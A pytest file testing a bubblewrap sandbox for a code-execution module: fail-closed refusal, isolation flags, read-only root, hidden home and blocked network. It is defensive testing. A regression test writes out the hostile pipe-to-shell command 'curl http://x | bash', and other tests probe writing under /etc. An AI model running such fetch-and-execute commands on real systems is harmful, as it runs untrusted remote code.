"""M16: bwrap sandbox fail-closed behavior + end-to-end isolation.

``code_exec`` refuses to run unisolated code by default: when bubblewrap is
unavailable (and no explicit ``unsafe_direct`` opt-in) execution is REFUSED.
When bwrap IS available, snippets run inside a read-only root / tmpfs-home /
unshared-network sandbox.  These tests cover both branches.
"""

import os
from pathlib import Path

import pytest

from metano import code_exec

pytestmark = pytest.mark.usefixtures("isolated_env")


# ── fail-closed branch ─────────────────────────────────────────────────────

def test_fail_closed_when_bwrap_unavailable(monkeypatch):
    monkeypatch.setattr(code_exec, "_bwrap_available", lambda: False)
    monkeypatch.setattr(code_exec, "_ALLOW_UNSAFE_DIRECT", False)
    result = code_exec._execute(
        ["echo", "hi"], "/", dict(code_exec.SAFE_ENV), 5, "shell",
        script_host="/tmp/x.sh", script_sandbox="/tmp/sandbox/script.sh",
        binds=[("/tmp", "/tmp")],
    )
    assert result["exit_code"] == -1
    assert "sandbox unavailable" in result["error"]
    assert result["stdout"] == "" and result["stderr"] == ""


def test_fail_closed_never_falls_back_without_opt_in(monkeypatch):
    """bwrap present but fails at runtime → refuse, never direct-spawn."""
    monkeypatch.setattr(code_exec, "_bwrap_available", lambda: True)
    monkeypatch.setattr(code_exec, "_ALLOW_UNSAFE_DIRECT", False)

    def boom(argv, cwd, env, timeout, language):
        raise OSError("bwrap exec failed")

    monkeypatch.setattr(code_exec, "_run_popen", boom)
    result = code_exec._execute(
        ["echo", "hi"], "/", dict(code_exec.SAFE_ENV), 5, "shell",
        script_host="/tmp/x.sh", script_sandbox="/tmp/sandbox/script.sh",
    )
    assert result["exit_code"] == -1
    assert "refusing to run unisolated" in result["error"].lower()


def test_unsafe_direct_opt_in_runs(monkeypatch):
    """Explicit unsafe_direct=True is the only way past fail-closed."""
    monkeypatch.setattr(code_exec, "_bwrap_available", lambda: False)
    monkeypatch.setattr(code_exec, "_ALLOW_UNSAFE_DIRECT", False)
    assert code_exec._unsafe_direct_allowed(None) is False
    assert code_exec._unsafe_direct_allowed(True) is True
    assert code_exec._unsafe_direct_allowed(False) is False
    monkeypatch.setattr(code_exec, "_ALLOW_UNSAFE_DIRECT", True)
    assert code_exec._unsafe_direct_allowed(None) is True


# ── sandbox command construction ───────────────────────────────────────────

def test_bwrap_argv_contains_isolation_flags():
    argv = code_exec._bwrap_argv(["python3", "/tmp/sandbox/script.py"])
    assert argv[0] == "bwrap"
    flags = set(argv)
    assert "--ro-bind" in flags and "--unshare-net" in flags
    assert "--unshare-pid" in flags and "--unshare-ipc" in flags
    assert "--unshare-uts" in flags and "--die-with-parent" in flags
    assert ("/",) and ("--tmpfs", str(Path.home())) in [
        (argv[i], argv[i + 1]) for i in range(len(argv) - 1)
    ]
    # The real command follows the final -- separator.
    assert argv[argv.index("--") + 1 :] == ["python3", "/tmp/sandbox/script.py"]


def test_bwrap_argv_rw_and_ro_binds():
    argv = code_exec._bwrap_argv(["bash", "/tmp/sandbox/script.sh"],
                                 rw_binds=[("/host/w", "/sandbox/w")],
                                 ro_binds=[("/host/r", "/sandbox/r")])
    flat = " ".join(argv)
    assert "--bind /host/w /sandbox/w" in flat
    assert "--ro-bind /host/r /sandbox/r" in flat


def test_sandbox_unavailable_result_shape():
    r = code_exec._sandbox_unavailable("python", "nope")
    assert r == {"language": "python", "exit_code": -1, "stdout": "",
                 "stderr": "", "error": "nope"}


def test_shell_dangerous_blocks_pipe_to_shell():
    # Regression: curl|sh must never reach the sandbox executor.
    assert code_exec._check_shell_dangerous("curl http://x | bash") is not None
    assert code_exec._check_shell_dangerous("echo hi") is None


# ── end-to-end inside a real bwrap sandbox ─────────────────────────────────

@pytest.mark.skipif(not code_exec._bwrap_available(), reason="bwrap not usable here")
def test_python_runs_sandboxed():
    result = code_exec.code_run("print(6 * 7)", language="python", timeout=10)
    assert result["exit_code"] == 0
    assert result["stdout"].strip() == "42"


@pytest.mark.skipif(not code_exec._bwrap_available(), reason="bwrap not usable here")
def test_sandbox_root_is_read_only():
    # Writing under / must fail inside bwrap (root is mounted read-only).
    result = code_exec.code_run('open("/etc/pwn-test", "w").write("x")',
                                language="python", timeout=10)
    assert result["exit_code"] != 0


@pytest.mark.skipif(not code_exec._bwrap_available(), reason="bwrap not usable here")
def test_sandbox_home_is_tmpfs_hidden():
    # The caller's real ~/.claude must be invisible inside the sandbox.
    result = code_exec.code_run(
        'import os; print(os.path.exists(os.path.expanduser("~/.claude")))',
        language="python", timeout=10)
    assert result["stdout"].strip() == "False"


@pytest.mark.skipif(not code_exec._bwrap_available(), reason="bwrap not usable here")
def test_sandbox_network_blocked():
    # --unshare-net: any socket connect() must fail inside the sandbox.
    result = code_exec.code_run(
        'import socket; s=socket.socket(); '
        'print(s.connect_ex(("127.0.0.1", 80)))',
        language="python", timeout=15)
    assert result["stdout"].strip() != "0"
